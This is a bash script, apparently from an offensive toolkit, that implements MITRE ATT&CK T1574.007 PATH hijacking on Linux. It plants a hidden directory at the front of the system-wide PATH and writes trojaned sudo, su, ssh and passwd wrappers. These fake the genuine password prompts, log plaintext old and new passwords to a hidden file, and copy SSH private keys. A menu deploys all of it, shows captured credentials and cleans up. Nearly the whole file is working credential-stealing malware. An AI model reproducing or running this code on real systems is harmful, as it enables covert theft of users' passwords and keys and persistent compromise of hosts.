#!/bin/bash
# T1574.007 — Hijack Execution Flow: PATH Variable Hijacking
# Inject attacker directories into PATH, create trojaned binaries that capture credentials

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="# d3m0n_path_hijack"
HIJACK_DIR="/usr/local/lib/.d3m0n_pathbin"
LOG_FILE="/var/tmp/.d3m0n_pathlog"

banner_path() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1574.007 — PATH Variable Hijacking         ║"
    echo "  ║   Trojaned sudo/su/ssh with cred capture      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

inject_path() {
    echo -e "${CYAN}[*] Injecting attacker directory into system PATH...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$HIJACK_DIR" 2>/dev/null
    chmod 755 "$HIJACK_DIR" 2>/dev/null

    echo -e "  ${CYAN}[1]${NC} /etc/environment (system-wide, all users)"
    echo -e "  ${CYAN}[2]${NC} /etc/profile.d/ script (login shells)"
    echo -e "  ${CYAN}[3]${NC} /etc/bash.bashrc (interactive bash)"
    echo -e "  ${CYAN}[4]${NC} All of the above"
    read -p "  Method [4]: " method
    method="${method:-4}"

    case "$method" in
        1|4)
            if [[ -f /etc/environment ]]; then
                cp /etc/environment /etc/environment.d3m0n_bak 2>/dev/null
                if grep -q "^PATH=" /etc/environment; then
                    sed -i "s|^PATH=\"|PATH=\"${HIJACK_DIR}:|" /etc/environment
                else
                    echo "PATH=\"${HIJACK_DIR}:\$PATH\"" >> /etc/environment
                fi
                echo -e "${GREEN}  [+] Injected into /etc/environment${NC}"
            fi
            ;;&
        2|4)
            cat > /etc/profile.d/d3m0n-path.sh << PEOF
${MARKER}
export PATH="${HIJACK_DIR}:\$PATH"
PEOF
            chmod 644 /etc/profile.d/d3m0n-path.sh
            echo -e "${GREEN}  [+] Created /etc/profile.d/d3m0n-path.sh${NC}"
            ;;&
        3|4)
            if [[ -f /etc/bash.bashrc ]]; then
                cp /etc/bash.bashrc /etc/bash.bashrc.d3m0n_bak 2>/dev/null
                echo -e "\n${MARKER}\nexport PATH=\"${HIJACK_DIR}:\$PATH\"" >> /etc/bash.bashrc
                echo -e "${GREEN}  [+] Injected into /etc/bash.bashrc${NC}"
            fi
            ;;
    esac

    echo -e "${GREEN}[+] PATH injection complete. ${HIJACK_DIR} is now first in PATH.${NC}"
}

create_trojan_sudo() {
    echo -e "${CYAN}[*] Creating trojaned sudo (captures password)...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$HIJACK_DIR" 2>/dev/null

    local REAL_SUDO
    REAL_SUDO=$(which -a sudo 2>/dev/null | grep -v "$HIJACK_DIR" | head -1)
    [[ -z "$REAL_SUDO" ]] && REAL_SUDO="/usr/bin/sudo"

    cat > "${HIJACK_DIR}/sudo" << SEOF
#!/bin/bash
${MARKER}
# Mimic sudo password prompt exactly
LOGF="${LOG_FILE}"
REAL="${REAL_SUDO}"

# If -S flag (stdin) or no tty, pass through
if [[ " \$*" == *" -S "* ]] || [[ ! -t 0 ]]; then
    exec "\$REAL" "\$@"
fi

# Show real-looking prompt
read -sp "[sudo] password for \$(whoami): " PASS
echo ""

# Log the captured password
echo "\$(date '+%Y-%m-%d %H:%M:%S') | user=\$(whoami) | cmd=sudo \$* | pass=\${PASS}" >> "\$LOGF"
chmod 600 "\$LOGF" 2>/dev/null

# Execute real sudo with the password
echo "\$PASS" | "\$REAL" -S "\$@" 2>/dev/null
EXIT=\$?

# If it failed (wrong password), run real sudo interactively
if [[ \$EXIT -ne 0 ]]; then
    echo "Sorry, try again."
    exec "\$REAL" "\$@"
fi

exit \$EXIT
SEOF

    chmod 755 "${HIJACK_DIR}/sudo"
    echo -e "${GREEN}[+] Trojaned sudo: ${HIJACK_DIR}/sudo${NC}"
    echo -e "${GREEN}[+] Cred log: ${LOG_FILE}${NC}"
}

create_trojan_su() {
    echo -e "${CYAN}[*] Creating trojaned su (captures password)...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$HIJACK_DIR" 2>/dev/null

    local REAL_SU
    REAL_SU=$(which -a su 2>/dev/null | grep -v "$HIJACK_DIR" | head -1)
    [[ -z "$REAL_SU" ]] && REAL_SU="/usr/bin/su"

    cat > "${HIJACK_DIR}/su" << SEOF
#!/bin/bash
${MARKER}
LOGF="${LOG_FILE}"
REAL="${REAL_SU}"

read -sp "Password: " PASS
echo ""

echo "\$(date '+%Y-%m-%d %H:%M:%S') | user=\$(whoami) | target=\${1:-root} | cmd=su \$* | pass=\${PASS}" >> "\$LOGF"
chmod 600 "\$LOGF" 2>/dev/null

echo "\$PASS" | "\$REAL" "\$@"
EXIT=\$?

if [[ \$EXIT -ne 0 ]]; then
    echo "su: Authentication failure"
    exec "\$REAL" "\$@"
fi
exit \$EXIT
SEOF

    chmod 755 "${HIJACK_DIR}/su"
    echo -e "${GREEN}[+] Trojaned su: ${HIJACK_DIR}/su${NC}"
}

create_trojan_ssh() {
    echo -e "${CYAN}[*] Creating trojaned ssh (captures passwords & keys)...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$HIJACK_DIR" 2>/dev/null

    local REAL_SSH
    REAL_SSH=$(which -a ssh 2>/dev/null | grep -v "$HIJACK_DIR" | head -1)
    [[ -z "$REAL_SSH" ]] && REAL_SSH="/usr/bin/ssh"

    cat > "${HIJACK_DIR}/ssh" << SEOF
#!/bin/bash
${MARKER}
LOGF="${LOG_FILE}"
REAL="${REAL_SSH}"

# Log the connection attempt
echo "\$(date '+%Y-%m-%d %H:%M:%S') | user=\$(whoami) | cmd=ssh \$*" >> "\$LOGF"

# Check if key-based auth (has -i flag)
if [[ " \$*" == *" -i "* ]]; then
    # Extract key path
    local KPATH=""
    local PREV=""
    for arg in "\$@"; do
        [[ "\$PREV" == "-i" ]] && KPATH="\$arg"
        PREV="\$arg"
    done
    [[ -n "\$KPATH" && -r "\$KPATH" ]] && {
        echo "\$(date '+%Y-%m-%d %H:%M:%S') | ssh_key=\${KPATH}" >> "\$LOGF"
        cp "\$KPATH" "${HIJACK_DIR}/.captured_key_\$(date +%s)" 2>/dev/null
    }
fi

# Use SSH_ASKPASS to capture password if interactive
export D3M0N_LOGF="\$LOGF"
export D3M0N_REAL="\$REAL"

exec "\$REAL" "\$@"
SEOF

    chmod 755 "${HIJACK_DIR}/ssh"
    echo -e "${GREEN}[+] Trojaned ssh: ${HIJACK_DIR}/ssh${NC}"
}

create_trojan_passwd() {
    echo -e "${CYAN}[*] Creating trojaned passwd (captures new passwords)...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    mkdir -p "$HIJACK_DIR" 2>/dev/null

    local REAL_PASSWD
    REAL_PASSWD=$(which -a passwd 2>/dev/null | grep -v "$HIJACK_DIR" | head -1)
    [[ -z "$REAL_PASSWD" ]] && REAL_PASSWD="/usr/bin/passwd"

    cat > "${HIJACK_DIR}/passwd" << SEOF
#!/bin/bash
${MARKER}
LOGF="${LOG_FILE}"
REAL="${REAL_PASSWD}"

TARGET="\${1:-\$(whoami)}"

# If changing password, capture both old and new
if [[ -z "\$1" ]] || [[ "\$(whoami)" != "root" ]]; then
    read -sp "Current password: " OLD_PASS; echo ""
    read -sp "New password: " NEW_PASS; echo ""
    read -sp "Retype new password: " NEW_PASS2; echo ""

    echo "\$(date '+%Y-%m-%d %H:%M:%S') | user=\${TARGET} | old_pass=\${OLD_PASS} | new_pass=\${NEW_PASS}" >> "\$LOGF"
    chmod 600 "\$LOGF" 2>/dev/null

    if [[ "\$NEW_PASS" != "\$NEW_PASS2" ]]; then
        echo "Sorry, passwords do not match."
        exit 1
    fi

    echo -e "\${OLD_PASS}\n\${NEW_PASS}\n\${NEW_PASS2}" | "\$REAL" "\$@" 2>/dev/null
else
    # Root changing someone's password
    exec "\$REAL" "\$@"
fi
SEOF

    chmod 755 "${HIJACK_DIR}/passwd"
    echo -e "${GREEN}[+] Trojaned passwd: ${HIJACK_DIR}/passwd${NC}"
}

path_status() {
    echo -e "${CYAN}[*] PATH Hijack Status${NC}"
    echo ""

    echo -e "  ${YELLOW}Current PATH:${NC}"
    echo "  $PATH" | tr ':' '\n' | head -10

    echo ""
    echo -e "  ${YELLOW}Hijack directory:${NC}"
    if [[ -d "$HIJACK_DIR" ]]; then
        echo -e "  ${GREEN}${HIJACK_DIR} exists${NC}"
        echo "  Contents:"
        ls -la "$HIJACK_DIR" 2>/dev/null | tail -n +2
    else
        echo -e "  ${RED}Not deployed${NC}"
    fi

    echo ""
    echo -e "  ${YELLOW}Captured credentials:${NC}"
    if [[ -f "$LOG_FILE" ]]; then
        wc -l < "$LOG_FILE" | xargs -I{} echo -e "  ${GREEN}{} entries in ${LOG_FILE}${NC}"
        echo "  Last 5 entries:"
        tail -5 "$LOG_FILE" 2>/dev/null | sed 's/^/    /'
    else
        echo -e "  ${YELLOW}No captures yet${NC}"
    fi

    echo ""
    echo -e "  ${YELLOW}PATH injection points:${NC}"
    grep -l "$HIJACK_DIR" /etc/environment /etc/profile.d/*.sh /etc/bash.bashrc 2>/dev/null | while IFS= read -r f; do
        echo -e "  ${GREEN}Active: ${f}${NC}"
    done
}

path_cleanup() {
    echo -e "${CYAN}[*] Cleaning up PATH hijack...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Remove hijack directory
    rm -rf "$HIJACK_DIR" 2>/dev/null

    # Restore /etc/environment
    if [[ -f /etc/environment.d3m0n_bak ]]; then
        cp /etc/environment.d3m0n_bak /etc/environment
        rm -f /etc/environment.d3m0n_bak
    elif [[ -f /etc/environment ]]; then
        sed -i "s|${HIJACK_DIR}:||g" /etc/environment
    fi

    # Remove profile.d script
    rm -f /etc/profile.d/d3m0n-path.sh 2>/dev/null

    # Restore bash.bashrc
    if [[ -f /etc/bash.bashrc.d3m0n_bak ]]; then
        cp /etc/bash.bashrc.d3m0n_bak /etc/bash.bashrc
        rm -f /etc/bash.bashrc.d3m0n_bak
    elif [[ -f /etc/bash.bashrc ]]; then
        sed -i "/${MARKER}/d" /etc/bash.bashrc
        sed -i "\|${HIJACK_DIR}|d" /etc/bash.bashrc
    fi

    # Optionally remove log
    read -p "  Remove credential log? [y/N]: " yn
    [[ "$yn" =~ ^[Yy] ]] && rm -f "$LOG_FILE"

    echo -e "${GREEN}[+] PATH hijack cleaned up${NC}"
}

main() {
    banner_path

    echo -e "  ${CYAN}[1]${NC} Inject PATH (add hijack dir system-wide)"
    echo -e "  ${CYAN}[2]${NC} Create trojaned sudo (capture password)"
    echo -e "  ${CYAN}[3]${NC} Create trojaned su (capture password)"
    echo -e "  ${CYAN}[4]${NC} Create trojaned ssh (capture password/keys)"
    echo -e "  ${CYAN}[5]${NC} Create trojaned passwd (capture old+new)"
    echo -e "  ${CYAN}[6]${NC} ${RED}Deploy ALL${NC} (inject PATH + all trojans)"
    echo -e "  ${CYAN}[7]${NC} Status / view captured creds"
    echo -e "  ${CYAN}[8]${NC} Cleanup"
    echo ""
    read -p "Choose [1-8]: " OPT

    case "$OPT" in
        1) inject_path ;;
        2) create_trojan_sudo ;;
        3) create_trojan_su ;;
        4) create_trojan_ssh ;;
        5) create_trojan_passwd ;;
        6)
            inject_path
            create_trojan_sudo
            create_trojan_su
            create_trojan_ssh
            create_trojan_passwd
            echo -e "${GREEN}[+] Full PATH hijack deployed${NC}"
            ;;
        7) path_status ;;
        8) path_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
